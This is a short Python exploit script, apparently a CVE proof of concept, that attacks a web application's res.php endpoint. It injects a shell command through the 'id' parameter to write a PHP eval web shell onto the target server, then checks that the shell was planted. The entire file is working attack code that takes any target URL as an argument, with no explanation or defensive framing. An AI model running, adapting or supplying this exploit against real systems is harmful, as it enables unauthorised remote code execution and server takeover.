import requests
import sys

def write_shell(url, shell_name):
    data = {
        "action": "alarm",
        "id": "1;echo '<?php eval($_POST[\"shell\"]);?>' >" + shell_name 
    }
    proxies = {
        "http": "http://127.0.0.1:7890",
        "https": "https://127.0.0.1:7890"
    }
    shell_url = url + shell_name
    url += "res.php"
    res = requests.post(url, data=data, proxies = proxies)
    if res.status_code != 200:
        print("[X] the site can't write shell!")
    res1 = requests.get(shell_url)
    if res1.status_code == 200 and res1.text == "":
        print("[+] The Shell has been written successfully!")
    else:
        print("[-] The Shell write fail!")

if __name__=="__main__":
    if len(sys.argv) != 3:
        print("[X] Error: Argument must be Three!")
        print("[!] For Example:\n[!] python CVE.py [URL] [Shell's Name]")
        exit(0)
    url = sys.argv[1]
    shell_name = sys.argv[2]
    write_shell(url, shell_name)